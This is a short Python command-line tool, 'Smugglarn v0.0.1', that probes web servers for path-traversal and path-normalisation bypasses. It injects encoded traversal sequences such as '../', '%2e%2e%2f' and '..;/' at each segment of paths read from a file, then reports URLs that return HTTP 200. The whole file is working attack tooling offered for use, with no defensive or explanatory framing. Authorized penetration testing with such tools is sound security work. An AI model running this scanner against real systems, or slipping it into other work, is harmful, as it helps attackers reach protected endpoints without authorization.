#!/usr/bin/python3
import requests
import sys
import getopt
import os.path
import re

travenc = ["../", "%2e./", ".%2e/", "%2e.%2f", ".%2e%2f", "..%2f", "%2e%2e%2f","..;/"]
version = "Smugglarn v0.0.1"

def send_requests_per_path(base, path, enp, header, proxy):
    if path[0] != "/":
        path = "/" + path
    path_comp = path.split('/')[1:]
    if proxy != '':
        manager=requests.urllib3.ProxyManager(proxy)
    else:
        manager=requests.urllib3.PoolManager()
    org_req = manager.request("GET", base+path[1:], headers=header)
    org_resp_code = org_req.status

    for inj_point in range(len(path_comp)):
        for trav in travenc:
            traversal = trav*(inj_point+1)
            probe = ''
            if enp == '':
                probe = path[1:]
            else:
                probe = enp[1:]
            
            url=base+'/'.join(path_comp[:inj_point+1])+'/'+traversal+probe
            r = manager.request("GET",url, headers=header)
            if r.status == 200:
                print(str(r.status) + ": " + url)

def print_help():
    help_text = '''Usage: smugglarn.py -u <base_url> -p <paths_file> [-e <probing_endpoint>, -H <header(s)>, -x <proxy_server>]'''
    print(help_text)

def main(argv):
    baseurl = ''
    endpoint = ''
    paths_file = ''
    headers = {}
    proxy = ''
    try:
        opts, args = getopt.getopt(argv,"hu:p:e:H:x:v")
    except getopt.GetoptError:
        print_help()
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print_help()
        elif opt == '-u':
            if arg[-1] != '/':
                baseurl = arg + '/'
            else:
                baseurl = arg
        elif opt == '-p':
            paths_file = arg
            if not os.path.exists(paths_file):
                print("File not found: " + paths_file)
                sys.exit(2)
        elif opt == '-e':
            endpoint = arg
        elif opt == '-H':
            s = re.search('^([^\:]*):\s*(.*$)', arg)
            if s.group(1) in headers:
                print("Header already set you fool!")
                sys.exit(2)
            headers[s.group(1)]=s.group(2)
        elif opt == '-x':
            proxy = arg
        elif opt == '-v':
            print(version)


    if baseurl == '' or paths_file == '':
        print_help()
        sys.exit(2)

    pf = open(paths_file)
    for line in pf:
        send_requests_per_path(baseurl, line[:-1], endpoint, headers, proxy)
    

if __name__ == "__main__":
    main(sys.argv[1:])

